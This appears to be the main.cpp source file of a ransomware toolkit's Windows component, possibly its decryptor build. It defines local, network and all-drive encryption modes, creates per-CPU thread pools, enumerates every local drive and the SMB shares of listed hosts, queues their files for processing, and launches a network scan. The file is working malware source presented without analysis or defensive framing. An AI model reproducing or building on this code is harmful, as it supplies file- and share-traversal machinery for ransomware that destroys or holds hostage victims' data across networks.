#include "common.h"
#include "filesystem.h"
#include "network_scanner.h"
#include "threadpool.h"
#include <Shlwapi.h>
#include "global_parameters.h"
#include "decryptor.h"

#pragma comment(lib, "Shell32.lib")


enum EncryptModes {

	ALL_ENCRYPT = 10,
	LOCAL_ENCRYPT = 11,
	NETWORK_ENCRYPT = 12

};

typedef struct string_ {

	WCHAR wszString[16384];
	TAILQ_ENTRY(string_) Entries;

} STRING, * PSTRING;

typedef TAILQ_HEAD(string_list_, string_) STRING_LIST, * PSTRING_LIST;

STATIC INT g_EncryptMode = ALL_ENCRYPT;
STATIC STRING_LIST g_HostList;
STATIC STRING_LIST g_PathList;

int main()
{
	HANDLE hLocalSearch = NULL;
	filesystem::DRIVE_LIST DriveList;
	network_scanner::SHARE_LIST ShareList;

	TAILQ_INIT(&DriveList);
	TAILQ_INIT(&ShareList);

	SYSTEM_INFO SysInfo;
	GetNativeSystemInfo(&SysInfo);

	DWORD dwLocalThreads = SysInfo.dwNumberOfProcessors;
	DWORD dwNetworkThreads = SysInfo.dwNumberOfProcessors;

	if (!threadpool::Create(threadpool::LOCAL_THREADPOOL, dwLocalThreads)) {
		return EXIT_FAILURE;
	}

	if (!threadpool::Start(threadpool::LOCAL_THREADPOOL)) {
		return EXIT_FAILURE;
	}

	if (!threadpool::Create(threadpool::NETWORK_THREADPOOL, dwNetworkThreads)) {
		return EXIT_FAILURE;
	}

	if (!threadpool::Start(threadpool::NETWORK_THREADPOOL)) {
		return EXIT_FAILURE;
	}

	//filesystem::SearchFiles(L"C:\\users\\toha\\Desktop\\test", threadpool::LOCAL_THREADPOOL);

	if (filesystem::EnumirateDrives(&DriveList)) {
		hLocalSearch = CreateThread(NULL, 0, filesystem::StartLocalSearch, &DriveList, 0, NULL);
	}

	PSTRING String = NULL;
	TAILQ_FOREACH(String, &g_HostList, Entries) {
		network_scanner::EnumShares(String->wszString, &ShareList);
	}

	network_scanner::PSHARE_INFO ShareInfo = NULL;
	TAILQ_FOREACH(ShareInfo, &ShareList, Entries) {
		filesystem::SearchFiles(ShareInfo->wszSharePath, threadpool::NETWORK_THREADPOOL);
	}

	network_scanner::StartScan();
	WaitForSingleObject(hLocalSearch, INFINITE);
	threadpool::Wait(threadpool::LOCAL_THREADPOOL);
	threadpool::Wait(threadpool::NETWORK_THREADPOOL);
	return EXIT_SUCCESS;
}